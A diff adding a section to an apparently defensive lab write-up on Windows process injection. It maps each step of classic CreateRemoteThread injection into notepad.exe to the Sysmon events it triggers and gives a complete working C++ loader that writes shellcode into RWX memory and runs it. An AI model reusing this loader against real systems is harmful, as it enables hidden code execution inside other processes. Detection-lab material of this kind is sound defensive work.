@@ -75,3 +75,69 @@ DWORD GetPID(const wchar_t* procName) {
     return pid;
 }
 ```
+
+## 1. Classic CreateRemoteThread
+The attack opens a handle to a running process, writes shellcode into its memory, then creates a new thread inside that process to execute it. All through documented Win32 API calls in kernel32.dll. It is the most well-known injection technique and every mature EDR detects it — which is exactly why it's your baseline.
+The four API calls and what Sysmon sees at each step:
+- OpenProcess()         → EID 10 — handle opened with PROCESS_ALL_ACCESS (0x1fffff)
+- VirtualAllocEx()      → allocates RWX memory in target (no Sysmon event)
+- WriteProcessMemory()  → writes shellcode bytes (no Sysmon event)
+- CreateRemoteThread()  → EID 8 — new thread created in remote process
+
+```
+// t1_classic_crt.cpp
+#include "common.h"
+
+int wmain() {
+    DWORD pid = GetPID(L"notepad.exe");
+    if (!pid) {
+        wprintf(L"[-] notepad.exe not found\n");
+        return 1;
+    }
+    wprintf(L"[*] Target PID: %lu\n", pid);
+
+    // EID 10 fires here
+    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    if (!hProc) {
+        wprintf(L"[-] OpenProcess failed: %lu\n", GetLastError());
+        return 1;
+    }
+    wprintf(L"[+] Handle acquired\n");
+
+    LPVOID remoteMem = VirtualAllocEx(
+        hProc, NULL, shellcode_size,
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_EXECUTE_READWRITE
+    );
+    if (!remoteMem) {
+        wprintf(L"[-] VirtualAllocEx failed\n");
+        return 1;
+    }
+    wprintf(L"[+] Remote memory allocated: 0x%p\n", remoteMem);
+
+    SIZE_T written = 0;
+    if (!WriteProcessMemory(hProc, remoteMem, shellcode, shellcode_size, &written)) {
+        wprintf(L"[-] WriteProcessMemory failed\n");
+        return 1;
+    }
+    wprintf(L"[+] Shellcode written: %zu bytes\n", written);
+
+    // EID 8 fires here
+    HANDLE hThread = CreateRemoteThread(
+        hProc, NULL, 0,
+        (LPTHREAD_START_ROUTINE)remoteMem,
+        NULL, 0, NULL
+    );
+    if (!hThread) {
+        wprintf(L"[-] CreateRemoteThread failed: %lu\n", GetLastError());
+        return 1;
+    }
+    wprintf(L"[+] Remote thread created\n");
+    wprintf(L"[*] Watch Elastic for EID 8 and EID 10\n");
+
+    WaitForSingleObject(hThread, 5000);
+    CloseHandle(hThread);
+    CloseHandle(hProc);
+    return 0;
+}
+```
